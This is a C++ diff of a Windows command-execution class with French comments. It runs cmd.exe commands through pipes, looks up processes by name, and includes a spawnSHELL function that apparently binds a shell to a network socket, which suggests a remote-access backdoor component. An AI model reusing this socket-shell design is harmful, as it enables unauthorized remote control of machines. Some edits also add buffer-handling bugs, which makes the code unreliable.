@@ -13,7 +13,6 @@ Exec::Exec()
 
 vector<DWORD> Exec::returnPid(wstring stringTargetProcessName)
 {
-    //cout << "name Proc>" <<  stringTargetProcessName << endl;
     wstring targetProcessName = stringTargetProcessName;
     wcout << targetProcessName  << endl;
     vector<DWORD> pids; //stock all pid in vector.
@@ -53,15 +52,15 @@ vector<DWORD> Exec::returnPid(wstring stringTargetProcessName)
 
 void Exec::setupAllPipe()
 {
-    SECURITY_ATTRIBUTES sa; 
+    
     // Réglez le drapeau bInheritHandle pour que les poignées de pipe soient héritées. 
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES); 
-    sa.bInheritHandle = TRUE; 
-    sa.lpSecurityDescriptor = NULL; 
+    security.nLength = sizeof(SECURITY_ATTRIBUTES); 
+    security.bInheritHandle = TRUE; 
+    security.lpSecurityDescriptor = NULL; 
     
     // Créer un tuyau pour le STDERR du processus enfant.  | Crée un tube anonyme et renvoie des poignées aux extrémités de lecture et d'écriture du tube.
     // cout << "GO PIPE " << endl;
-    if(!CreatePipe(&a_hChildStd_ERR_Rd, &a_hChildStd_ERR_Wr, &sa, 0)) 
+    if(!CreatePipe(&a_hChildStd_ERR_Rd, &a_hChildStd_ERR_Wr, &security, 0)) 
     {
         a_error = TRUE;
     //    exit(1); 
@@ -73,7 +72,7 @@ void Exec::setupAllPipe()
        // exit(1);
     }
      // Créer un tuyau pour le processus de l'enfant STDOUT. | Crée un tube anonyme et renvoie des poignées aux extrémités de lecture et d'écriture du tube.
-    if(!CreatePipe(&a_hChildStd_OUT_Rd, &a_hChildStd_OUT_Wr, &sa, 0) ) 
+    if(!CreatePipe(&a_hChildStd_OUT_Rd, &a_hChildStd_OUT_Wr, &security, 0) ) 
     {
         //cout <<" NO CREATE PIPE" << endl;
         a_error = TRUE;
@@ -94,11 +93,7 @@ void Exec::setupAllPipe()
 
 PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
 {
-    /*
-    Note: 
-    To create a command redirection in unicode(utf16) it is necessary to have the argument /U and the parameter CREATE_UNICODE_ENVIRONMENT in createprocessW.
-    */
-    wstring command_C = L"/U /C " + command ;
+    wstring command_C = L"/C " + command;
     WCHAR *argv_cmd = &command_C[0]; //arguments
     
     PROCESS_INFORMATION piProcInfo; 
@@ -106,34 +101,33 @@ PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
     bool bSuccess = FALSE; 
 
     ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION)); 
-
-    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
-    siStartInfo.cb = sizeof(STARTUPINFO); 
+    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));
+    
+    siStartInfo.cb = sizeof(STARTUPINFOW); 
     siStartInfo.hStdError = a_hChildStd_ERR_Wr;
     siStartInfo.hStdOutput = a_hChildStd_OUT_Wr;
     siStartInfo.dwFlags |= STARTF_USESTDHANDLES; //Les membres hStdInput , hStdOutput et hStdError contiennent des informations supplémentaires. Si cet indicateur est spécifié lors de l'appel de l'une des fonctions de création de processus, les handles doivent être héritables et le paramètre bInheritHandles de la fonction doit être défini sur TRUE. Pour plus d'informations, consultez Gérer l'héritage .
 
-
     wcout << argv_cmd << endl;
+
     bSuccess = CreateProcessW(L"C:\\windows\\system32\\cmd.exe",  //command line 
         argv_cmd,     // argv of cmd
-        NULL,          // process security attributes 
-        NULL,          // primary thread security attributes 
+        &security,          // process security attributes 
+        &security,          // primary thread security attributes 
         TRUE,          // handles are inherited 
-        CREATE_UNICODE_ENVIRONMENT,             // creation flags 
+        0,             // creation flags 
         NULL,          // use parent's environment 
         NULL,          // use parent's current directory 
         &siStartInfo,  // STARTUPINFO pointer 
         &piProcInfo);  // receives PROCESS_INFORMATION
-   
+    
     BOOL statusObject = WaitForSingleObject(piProcInfo.hProcess, TIMEOUT_CREATE_PROC);
 
     if(statusObject == WAIT_TIMEOUT)
     {
         //if timeout
         a_timeout = TRUE;
-        cout << "timeout !!" << endl; 
-        
+        wcout << "timeout !!" << endl; 
     }
 
     CloseHandle(a_hChildStd_ERR_Wr);
@@ -145,27 +139,27 @@ PROCESS_INFORMATION Exec::createChildProcess(wstring &command)
     if (!bSuccess)
     {
         a_error = TRUE;
+        wcout << "error 1" << endl;
+        wcout << GetLastError() << endl;
         //exit(1);
     }
     return piProcInfo;
 }
 
-vector<wstring> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
+vector<string> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
 {
-
     int index=0;
     wstring tmp_for_vector,result_of_command;
 
-
     DWORD dwRead; 
-    WCHAR chBuf[4096];
+    CHAR chBuff[4096];
 
     wstring out,err;
-    vector<wstring> result;
+    vector<string> result;
 
     while(true) //Read buffer of anonymous pipe and append the result in result_of_command
     {
-        if(!ReadFile(a_hChildStd_OUT_Rd, &chBuf, 4096 ,&dwRead,NULL))
+        if(!ReadFile(a_hChildStd_OUT_Rd, &chBuff, BUFFER_EXEC ,&dwRead,NULL))
         {
             //cout << " readFromPipe Error in read pipe childen out" << endl;
             break;
@@ -178,63 +172,60 @@ vector<wstring> Exec::readFromPipe(PROCESS_INFORMATION piProcInfo)
         I don't understand where the problem comes from. 
         */
         
-        wstring s(chBuf, dwRead);
+        string s  = chBuff;
         
-        wcout << "strlen: " << wcslen(chBuf) << endl;
+        cout << strlen(chBuff) << endl;
 
         result.push_back(s);
-
         s.erase();
 
-        ZeroMemory(&chBuf,wcslen(chBuf));
-        
+        ZeroMemory(&chBuff,  strlen(chBuff));
     }
    
-    ZeroMemory(&chBuf,wcslen(chBuf));
+    ZeroMemory(&chBuff, strlen(chBuff));
     
     //read stderr
     //cout << "-------------------------------------\n\n" << endl;
 
     while (true)
     {
-        if(!ReadFile(a_hChildStd_ERR_Rd, chBuf, BUFFER_EXEC,&dwRead,NULL))
+        if(!ReadFile(a_hChildStd_ERR_Rd, chBuff, BUFFER_EXEC,&dwRead,NULL))
         {
             //cout << "stderr: Error in read pipe childen out " << endl;
             break;
         }
-
-        wstring s(chBuf, dwRead);
+        //int stat = MultiByteToWideChar(CP_UTF8, MB_COMPOSITE, chBuf, strlen(chBuf),wChBuf, wcslen(wChBuf));
+        string s =  chBuff;
         
-        wcout << "strlen: " << wcslen(chBuf) << endl;
+        cout << strlen(chBuff) << endl;
 
         result.push_back(s);
         s.erase();
 
-        ZeroMemory(&chBuf,wcslen(chBuf));
+        ZeroMemory(&chBuff, strlen(chBuff));
     } 
-   // for(int i=0;i<result.size();i++)
-   // {wcout << result[i] << endl;}
-
     return result;
 }
 
-vector<wstring> Exec::executeCommand(wstring command)
+
+vector<string> Exec::executeCommand(wstring command)
 {
-    vector<wstring> result_of_command;
+    vector<string> result_of_command;
 
     setupAllPipe();
     PROCESS_INFORMATION piProcInfo = createChildProcess(command);
     
     if(a_error)
     {
-        result_of_command.push_back(L"[-] FATAL ERROR.");
+        result_of_command.push_back("[-] FATAL ERROR.");
         return result_of_command;
     }
     else
     {
         if((GetFileSize(a_hChildStd_OUT_Rd,NULL) == 0) && (GetFileSize(a_hChildStd_ERR_Rd,NULL) == 0)) //error no read in pipes. | if timeout or pipe_err and pipe_our is empty.
         {
-            result_of_command.push_back(L"The command was executed successfully but no data was returned.");
+            result_of_command.push_back("The command was executed successfully but no data was returned.");
+            result_of_command = readFromPipe(piProcInfo);//TO delete
             //If the size of stdout and stderr are = 0 it doesn't mean that there must be an error.
         }
         else if(a_timeout) //If the command has passed the timeout then don't read the pipes and try to kill the process that is causing the problem. 
@@ -266,9 +257,11 @@ vector<wstring> Exec::executeCommand(wstring command)
 
         //Finally return result_of_command
         //cout << "RESULT:  " << result_of_command << endl;
+        cout << "len result command [0]: " << result_of_command[0].length() << endl;
         return result_of_command; 
     }
 }
+
 
 void Exec::spawnSHELL(int sock, wchar_t *prog) //Change to WCHAR
 {
@@ -293,7 +286,7 @@ void Exec::spawnSHELL(int sock, wchar_t *prog) //Change to WCHAR
         NULL,          // process security attributes 
         NULL,          // primary thread security attributes 
         TRUE,          // handles are inherited 
-        CREATE_UNICODE_ENVIRONMENT,             // creation flags 
+        0,             // creation flags 
         NULL,          // use parent's environment 
         NULL,          // use parent's current directory 
         &siStartInfo,  // STARTUPINFO pointer 
@@ -304,9 +297,9 @@ void Exec::spawnSHELL(int sock, wchar_t *prog) //Change to WCHAR
     CloseHandle(piProcInfo.hThread);
 }
 
+
 Exec::~Exec()
 {
-
     CloseHandle(a_hChildStd_OUT_Rd);
     CloseHandle(a_hChildStd_ERR_Rd);
 }
